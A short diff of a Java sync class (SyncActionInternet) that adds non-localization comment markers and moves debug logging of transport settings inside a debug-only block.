@@ -24,7 +24,7 @@ import com.android.service.util.WChar;
  */
 public class SyncActionInternet extends SyncAction {
 
-	private static final String TAG = "SyncActionInternet";
+	private static final String TAG = "SyncActionInternet"; //$NON-NLS-1$
 
 	/** The wifi forced. */
 	protected boolean wifiForced;
@@ -72,17 +72,18 @@ public class SyncActionInternet extends SyncAction {
 
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: params FAILED");
+				Check.log(TAG + " Error: params FAILED"); //$NON-NLS-1$
 			}
 			return false;
 		}
-		final StringBuffer sb = new StringBuffer();
-		sb.append("gprs: " + gprs);
-		sb.append(" wifi: " + wifi);
-		sb.append(" wifiForced: " + wifiForced);
-		sb.append(" host: " + host);
+
 		if (Cfg.DEBUG) {
-			Check.log(TAG + sb.toString());
+			final StringBuffer sb = new StringBuffer();
+			sb.append("gprs: " + gprs); //$NON-NLS-1$
+			sb.append(" wifi: " + wifi); //$NON-NLS-1$
+			sb.append(" wifiForced: " + wifiForced); //$NON-NLS-1$
+			sb.append(" host: " + host); //$NON-NLS-1$
+			Check.log(TAG + sb.toString()) ;//$NON-NLS-1$
 		}
 		return true;
 	}
@@ -98,14 +99,14 @@ public class SyncActionInternet extends SyncAction {
 		
 		if (wifi) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " initTransport adding WifiTransport");
+				Check.log(TAG + " initTransport adding WifiTransport"); //$NON-NLS-1$
 			}
 			transports.addElement(new WifiTransport(host, wifiForced));
 		}
 
 		if (gprs) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " initTransport adding DirectTransport");
+				Check.log(TAG + " initTransport adding DirectTransport"); //$NON-NLS-1$
 			}
 			transports.addElement(new GprsTransport(host));
 		}
